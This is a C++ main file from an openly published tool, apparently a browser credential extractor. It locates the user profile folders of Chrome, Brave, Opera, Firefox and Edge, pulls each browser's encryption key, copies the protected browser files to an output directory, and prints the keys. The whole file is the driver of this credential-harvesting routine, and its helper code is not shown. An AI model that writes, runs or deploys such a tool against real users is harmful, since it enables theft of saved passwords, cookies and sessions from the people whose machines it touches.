// Copyright (c) Nouman Tajik [github.com/tajiknomi]
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE. 1 

#include <iostream>
#include "BrowserKeyExtract.h"
#include "utility.h"

#define NumberOfArgs	2


int main(int argc, char* argv[]) {

	if (argc != NumberOfArgs) {
		std::cerr << "Usage: " << extractFileNameFromPath(std::string(argv[0])) << " <path/to/output/directory>\n";
		return EXIT_FAILURE;
	}

	const std::string destinationPath (argv[1]);

	const std::string username { getusername() };
	std::vector<std::string> absolutePaths = makeAbsolutePaths(username, Browser::relativePaths);
	std::string chromePath = extractPathsForSpecificBrowser(absolutePaths, "Google");
	std::string operaPath = extractPathsForSpecificBrowser(absolutePaths, "Opera");
	std::string firefoxPath = extractPathsForSpecificBrowser(absolutePaths, "Firefox");
	std::string edgePath = extractPathsForSpecificBrowser(absolutePaths, "Edge");
	std::string bravePath = extractPathsForSpecificBrowser(absolutePaths, "Brave");
	
	Browser chrome, opera, edge, firefox, brave;

	chrome.ExtractKey(chromePath);
	chrome.WriteExtractedKeyToFile(destinationPath);
	chrome.ExtractFiles(chromePath, destinationPath);

	brave.ExtractKey(bravePath);
	brave.WriteExtractedKeyToFile(destinationPath);
	brave.ExtractFiles(bravePath, destinationPath);

	opera.ExtractKey(operaPath);
	opera.ExtractFiles(operaPath, destinationPath);
	opera.WriteExtractedKeyToFile(destinationPath);

	firefox.ExtractFiles(firefoxPath, destinationPath);

	edge.ExtractKey(edgePath);
	edge.ExtractFiles(edgePath, destinationPath);
	edge.WriteExtractedKeyToFile(destinationPath);

	chrome.ShowKey();
	brave.ShowKey();
	opera.ShowKey();
	edge.ShowKey();

	return 0;
}